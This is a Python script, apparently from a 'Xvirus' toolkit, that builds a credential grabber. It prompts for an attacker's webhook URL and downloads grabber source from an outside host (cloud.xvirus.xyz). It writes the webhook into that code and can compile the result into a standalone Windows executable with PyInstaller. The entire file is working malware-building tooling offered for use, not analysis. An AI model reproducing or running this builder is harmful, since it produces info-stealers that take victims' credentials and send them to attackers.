import os
import subprocess
import requests
import sys
from util.plugin.common import *

def grabberbuilder():
    webhook = input(f'Webhook: ')
    validateWebhook(webhook)
    name = input(f'File Name: ')

    # Create "output" folder if it doesn't exist
    if not os.path.exists('output'):
        os.makedirs('output')

    src = requests.get('https://cloud.xvirus.xyz/xvirusgrabber.txt')
    with open(f'output/{name}.py', 'wb')as grabx:
        grabx.write(src.content)
    with open(f'output/{name}.py', 'r') as file:
        filedata = file.read()

    text_to_replace = '"WEBHOOK_URL"'
    new_text = f'"{webhook}"'
    filedata = filedata.replace(text_to_replace, new_text)

    with open(f'output/{name}.py', 'w') as file:
        file.write(filedata)

    exe = input(f'Do you want to make {name}.py to an exe y/n: ')
    if exe == "y":
        def create_exe(script_file):
            script_path = os.path.abspath(script_file)
            script_dir = os.path.dirname(script_path)
            subprocess.call([sys.executable, "-m", "PyInstaller", "--onefile", script_path], cwd=script_dir)
        create_exe(f'output/{name}.py')
        input(f"File is in output/dist/{name}.exe ")
        main()
    else:
        input(f'Check output/{name}.py')
        main()

grabberbuilder()
